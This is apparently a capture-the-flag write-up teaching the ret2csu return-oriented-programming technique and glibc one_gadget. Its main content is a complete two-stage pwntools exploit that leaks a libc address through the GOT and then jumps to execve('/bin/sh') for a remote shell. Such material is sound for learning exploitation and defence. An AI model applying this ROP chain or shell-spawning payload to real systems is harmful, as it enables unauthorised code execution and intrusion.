
# ret2csu

This technique is used when there are not enough gadgets in the binary. Usually you may find gadgets for `%rdi` and `%rsi`, but not for `%rdx`. So it would be difficult to invoke `execve(rdi, rsi, rdx)` in that case. 

## requirements

* Code execution control (`%rip`)
* Stack control to write ROP chain
* A memory location which will contain an address where a CALL gadget will return to.
  * The address of the above memory location

## results

* Control various registers, including `%rdx`
* Control stack base point register `%rbp`
  * Control a fake stake if you combine this with `leave` instructions from the rest of the binary.

## `__libc_csu_init()`

Every dynamically linked binary has a function `__libc_csu_init()` which is invoked at some point before main. This function is used to populate many registers. A disassembly of this function looks like:

```asm
undefined __stdcall __libc_csu_init(EVP_PKEY_CTX * param
    undefined         AL:1               <RETURN>
    EVP_PKEY_CTX *    RDI:8              param_1
    undefined8        RSI:8              param_2
    undefined8        RDX:8              param_3
0x401170 <+0>:     endbr64 
0x401174 <+4>:     push   r15
0x401176 <+6>:     lea    r15,[rip+0x2c83]        # 0x403e00
0x40117d <+13>:    push   r14
0x40117f <+15>:    mov    r14,rdx
0x401182 <+18>:    push   r13
0x401184 <+20>:    mov    r13,rsi
0x401187 <+23>:    push   r12
0x401189 <+25>:    mov    r12d,edi
0x40118c <+28>:    push   rbp
0x40118d <+29>:    lea    rbp,[rip+0x2c74]        # 0x403e08
0x401194 <+36>:    push   rbx
0x401195 <+37>:    sub    rbp,r15
0x401198 <+40>:    sub    rsp,0x8
0x40119c <+44>:    call   0x401000 <_init>
0x4011a1 <+49>:    sar    rbp,0x3
0x4011a5 <+53>:    je     0x4011c6 <__libc_csu_init+86>
0x4011a7 <+55>:    xor    ebx,ebx
0x4011a9 <+57>:    nop    DWORD PTR [rax+0x0]
0x4011b0 <+64>:    mov    rdx,r14
0x4011b3 <+67>:    mov    rsi,r13
0x4011b6 <+70>:    mov    edi,r12d
0x4011b9 <+73>:    call   QWORD PTR [r15+rbx*8]
0x4011bd <+77>:    add    rbx,0x1
0x4011c1 <+81>:    cmp    rbp,rbx
0x4011c4 <+84>:    jne    0x4011b0 <__libc_csu_init+64>
0x4011c6 <+86>:    add    rsp,0x8
0x4011ca <+90>:    pop    rbx
0x4011cb <+91>:    pop    rbp
0x4011cc <+92>:    pop    r12
0x4011ce <+94>:    pop    r13
0x4011d0 <+96>:    pop    r14
0x4011d2 <+98>:    pop    r15
0x4011d4 <+100>:   ret   
```

So we identify two gadgets here:

* A call gadget
    ```asm
    0x4011b0 <+64>:    mov    rdx,r14
    0x4011b3 <+67>:    mov    rsi,r13
    0x4011b6 <+70>:    mov    edi,r12d
    0x4011b9 <+73>:    call   QWORD PTR [r15+rbx*8]
    ```
* A return gadget
    ```asm
    0x4011ca <+90>:    pop    rbx
    0x4011cb <+91>:    pop    rbp
    0x4011cc <+92>:    pop    r12
    0x4011ce <+94>:    pop    r13
    0x4011d0 <+96>:    pop    r14
    0x4011d2 <+98>:    pop    r15
    0x4011d4 <+100>:   ret   
    ```

So, we first use the return gadget to set `%rbx` to zero and `%r15` to point to a memory location that contains a return address for our call gadget. Then, we use the call gadget to set `%rdx` to the value that we want.

## one-gadget

One gadget is a technique used to invoke `execve('/bin/sh', NULL, NULL)` using a single gadget that is present in the glibc library. The tool is available on [github.com/david942j/one_gadget](https://github.com/david942j/one_gadget). There are many available such gadgets in glibc and not only a single one. We demonstrate its usage in the solution to the challenge.

### requirements

* libc base address and exact version
* Ability to control `%rip`

### results

Spawn a remote shell.

## Solution to the challenge

This is a two-stage solution. In the fist stage we want to leak libc's address and in the second stage we want to use that address to calculate the offset for the one-gadget. But first, some general code:

```python
nop_gadget = 0x40101a # ret;
rdi_gadget = 0x4011d3 # pop rdi; ret;
rsi_gadget = 0x4011d1 # pop rsi; pop r15; ret;

ret2csu_call   = 0x4011b0 # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8];
ret2csu_setter = 0x4011ca # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;

# (gef) got
# GOT protection: Partial RelRO | GOT functions: 2
write__got_plt = 0x404018   # [0x404018] write@GLIBC_2.2.5  →  0x401036
gets__got_plt  = 0x404020   # [0x404020] gets@GLIBC_2.2.5  →  0x401046
main = 0x00401136
```

### Stage 1 - leaking libc

In order to leak the address of libc, we want to invoke `write(1, gets@got, 0x100)`. So we want:

* `%rdi = 1`
* `%rsi = gets@got`
* `%rdx = 0x100`

We will control `%rdi` and `%rsi` through regular gadgets and will use ret2csu in order to control `%rdx`.

The program invokes `write(1, %rbp-0x40, 0xb)`. So we also want to have a fake stack such that `%rbp-0x40 == gets@got`.

```python
# RW-page: [0x404000, 0x405000). The write areas here become stacks
write_area_first = 0x404800
write_area_second = 0x404700 # Use a different write area since the previous one became stack. Used to write our 3rd ROP chain.
  # When $rip is at `CALL gets(rdi)`, and we pass our 3rd ROP chain as input, the following is our stack:
  #   $rsp = 0x4048b8 = write_area_first  + something
  #   $rbp = 0x404740 = write_area_second + 0x40
  #   $rdi = write_area_second
  # This means that the bytes that we will write through gets() should NOT override our current stack! 
  # On the other hand, NOR should write_area_second overlap with the stack frame of gets()!
  # That is why in the write_area_second we choose an address that is smaller than write_area_first, but 
  # with large enough difference (write_area_first - write_area_second) so that our input will not overwrite the current stack.
  #
  # Also note that, once we have executed our 2nd ROP chain and we are sending the input for our 3rd ROP chain,
  # we are no longer interested in the value that we had written in write_area_first.

io.recvuntil(b'Your name: ')

# Set buf to point to our write area (fake stack)
payload  = b'A'*0x40 # padding
payload += p64(write_area_first + 0x40) # rbp
payload += p64(main + 0x1e) # ret to `LEA rbp-0x40` and start reading input again through gets(buf);
payload += b'\n' # Now, once `LEAVE` is called again in main, we will also have control of $rsp.
io.send(payload)

# Write to that area the return address for ret2csu_call gadget. Then return to our rop chain.
payload  = p64(rdi_gadget) # ret2csu_call gadget shall return to the address specified here
payload += b'D'*0x38
payload += b'E'*0x08 # rbp. Don't care. Will get overwritten
payload += p64(ret2csu_setter) # ret addr
payload += ( # ret2csu_setter arguments
    p64(0x0000000000000000) + # rbx
    p64(write_area_second + 0x40) + # rbp. Once our rop chain is finished, we still return to the `CALL gets` at main.
    p64(0x0000000000000000) + # r12
    p64(0x0000000000000000) + # r13
    p64(0x100) + # r14 (Will go into rdx)
    p64(write_area_first) + # r15. Will be used in the next gadget as: ret_addr = *r15
    p64(ret2csu_call) # ret_addr
)
payload += b'' # ret2csu_call arguments (Takes no arguments). This is also a call gadget.
payload += ( # rdi_gadget. Used here to consume the pushed ret addr from the call gadget
    # consumed stack value goes into rdi
    p64(rdi_gadget) # ret_addr
)
payload += ( # rdi_gadget arguments.
    p64(0x01) + # rdi
    p64(rsi_gadget) # ret_addr
)
payload += ( # rsi_gadget
    p64(write__got_plt) + # rsi. Could also have been `gets__got_plt`
    p64(0x0000000000000000) + # r15
    p64(0x0040114f) #ret_addr. Return to `CALL write` in main. Afterwards, we also end up in `gets(buf)` so we can write a new rop chain
)
payload += b'\n'
io.send(payload)

# Read leaked libc address
leaked_write__addr = u64(io.recvn(0x100)[0:8])
```

Now that we have successfully leaked a libc address, we use the last 3 bytes which are the offset within the page to determine the exact libc that is being used by the remote machine. For that, we use the [web version](https://libc.rip) of the [libc database tool](https://github.com/niklasb/libc-database).

![libc Search Example](libc-search-webtool.png)

So we get that this is libc version 2.31 from an Ubuntu machine. Doing a quick google search for ubuntu packages, we also figure out that this is a Ubuntu 20.04 LTS (Focal Release) machine. We also see that write is at `base_address + 0x1111d0`. So we can easily calculate libc's base address:

```python
libc__base_addr = leaked_write__addr - 0x1111d0
log.success('Successfully leaked libc base address: ' + hex(libc__base_addr)) # e.g. 0x7fe218b4a000
```

### Stage2 - one_gadget to invoke `execve("/bin/sh\x00", NULL, NULL)`

Next we use [one_gadget tool](https://github.com/david942j/one_gadget) to find the offset of libc's one gadget. We download the libraries from the libc database tool and use them with one gadget.

```bash
nikos@laptop:~/downloads$ one_gadget libc6_2.31-0ubuntu9.1_amd64.so
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

nikos@laptop:~/downloads$ one_gadget libc6_2.31-0ubuntu9.2_amd64.so
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL
```

So we get the same offset for both 9.1 and 9.2. Let's go with 9.1. The constraints for the one-gadget are `%r15 == 0x00` and `%r12 == 0x00`. These constraints have already been met from executing ret2csu during stage 1. So we can just proceed with out payload.

```python
one_gadget = libc__base_addr + 0xe6c7e # execve("/bin/sh", r15, r12)

# Do ROP again to invoke execve("/bin/sh", NULL, NULL) this time
payload  = b'A'*0x40
payload += b'B'*0x08 # rbp
payload += p64(one_gadget) # constraints are already met when we reach the one_gadget
payload += b'\n'
io.send(payload)

io.interactive()
io.close()
```
